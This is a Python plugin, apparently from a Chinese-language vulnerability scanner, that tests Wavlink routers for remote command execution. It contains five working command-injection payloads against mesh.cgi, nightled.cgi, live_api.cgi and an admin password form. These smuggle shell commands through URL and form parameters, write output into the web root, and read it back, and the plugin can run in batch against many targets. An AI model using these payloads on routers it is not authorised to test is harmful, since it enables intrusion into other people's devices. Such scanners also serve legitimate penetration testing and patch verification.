#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests,urllib3
urllib3.disable_warnings()

class Wavlink_Rce_Scan:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + "/cgi-bin/mesh.cgi?page=upgrade&key=%27;id%3E%3Evulscs.txt'"
        url3 = url + "/cgi-bin/vulscs.txt"
        data = "page=night_led&start_hour=;id;"
        try:
            req = requests.post(url2, verify=self.verify,proxies=self.proxy,headers=self.header,data=data)
            req2 = requests.get(url3, verify=self.verify,proxies=self.proxy,headers=self.header)

            if "uid=" in req2.text:
                OutPrintInfoSuc("Wavlink", f"存在Wavlink路由器远程命令漏洞 {url3}")

                if not self.batch:
                    OutPrintInfo("Wavlink", f"Response: \n{req2.text.strip()}")
                else:
                    with open("./result/wavlink_rce.txt","a") as w:
                        w.write(f"{url3}\n")

            else:
                if not self.batch:
                    OutPrintInfo("Wavlink", f"不存在Wavlink路由器远程命令漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Wavlink", "不存在Wavlink路由器远程命令漏洞")
            return
    def send_payload2(self,url):
        url2 = url + "/cgi-bin/mesh.cgi?page=upgrade&key=';id>./vulscs2.txt;'"
        url3 = url + "/cgi-bin/vulscs2.txt"

        try:
            req = requests.post(url2, verify=self.verify,proxies=self.proxy,headers=self.header)
            req2 = requests.get(url3, verify=self.verify,proxies=self.proxy,headers=self.header)

            if "uid=" in req2.text:
                OutPrintInfoSuc("Wavlink", f"存在Wavlink路由器远程命令漏洞 {url3}")

                if not self.batch:

                    OutPrintInfo("Wavlink", f"Response: \n{req2.text.strip()}")
                else:
                    with open("./result/wavlink_rce.txt", "a") as w:
                        w.write(f"{url3}\n")

            else:
                if not self.batch:
                    OutPrintInfo("Wavlink", f"不存在Wavlink路由器远程命令漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Wavlink", "不存在Wavlink路由器远程命令漏洞")
            return
    def send_payload3(self,url):
        url2 = url + "/cgi-bin/nightled.cgi"
        data = "page=night_led&start_hour=;id;"
        try:
            req = requests.post(url2, verify=self.verify,proxies=self.proxy,headers=self.header,data=data)

            if "uid=" in req.text or "uid=" in req.headers:
                OutPrintInfoSuc("Wavlink", f"存在Wavlink路由器远程命令漏洞 {url2}")

                if not self.batch:

                    OutPrintInfo("Wavlink", f"Response: \n{req.text.strip()}")
                else:
                    with open("./result/wavlink_rce.txt", "a") as w:
                        w.write(f"{url2}\n")

            else:
                if not self.batch:
                    OutPrintInfo("Wavlink", f"不存在Wavlink路由器远程命令漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Wavlink", "不存在Wavlink路由器远程命令漏洞")
            return
    def send_payload4(self,url):
        url2 = url + "/cgi-bin/live_api.cgi?page=abc&id=173&ip=;id;"
        try:
            req = requests.get(url2, verify=self.verify,proxies=self.proxy,headers=self.header)

            if "uid=" in req.text:
                OutPrintInfoSuc("Wavlink", f"存在Wavlink路由器远程命令漏洞 {url2}")

                if not self.batch:

                    OutPrintInfo("Wavlink", f"Response: \n{req.text.strip()}")
                else:
                    with open("./result/wavlink_rce.txt", "a") as w:
                        w.write(f"{url2}\n")

            else:
                if not self.batch:
                    OutPrintInfo("Wavlink", f"不存在Wavlink路由器远程命令漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Wavlink", "不存在Wavlink路由器远程命令漏洞")
            return
    def send_payload5(self,url):
        url2 = url + "/cgi-bin/mesh.cgi?page=upgrade&key=%27;id%3E%3Evulscs.txt'"
        url3 = url + "/vulscs.html"
        data = "page=sysAdm&SYSPASS=password&username='`id>/etc_ro/lighttpd/www/vulscs.html`'&newpass=12345678"
        try:
            req = requests.post(url2, verify=self.verify, proxies=self.proxy, headers=self.header, data=data)
            req2 = requests.get(url3, verify=self.verify, proxies=self.proxy, headers=self.header)

            if "uid=" in req2.text:
                OutPrintInfoSuc("Wavlink", f"存在Wavlink路由器远程命令漏洞 {url3}")

                if not self.batch:

                    OutPrintInfo("Wavlink", f"Response: \n{req.text.strip()}")
                else:
                    with open("./result/wavlink_rce.txt", "a") as w:
                        w.write(f"{url3}\n")

            else:
                if not self.batch:
                    OutPrintInfo("Wavlink", f"不存在Wavlink路由器远程命令漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Wavlink", "不存在Wavlink路由器远程命令漏洞")
            return


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Wavlink", "开始检测Wavlink路由器远程命令漏洞...")
            OutPrintInfo("Wavlink", "开始检测POC-1...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("Wavlink", "开始检测POC-2...")
        self.send_payload2(url)
        if not self.batch:
            OutPrintInfo("Wavlink", "开始检测POC-3...")
        self.send_payload3(url)
        if not self.batch:
            OutPrintInfo("Wavlink", "开始检测POC-4...")
        self.send_payload4(url)
        if not self.batch:
            OutPrintInfo("Wavlink", "开始检测POC-5...")
        self.send_payload5(url)
        if not self.batch:
            OutPrintInfo("Wavlink", "Wavlink路由器远程命令漏洞检测结束")
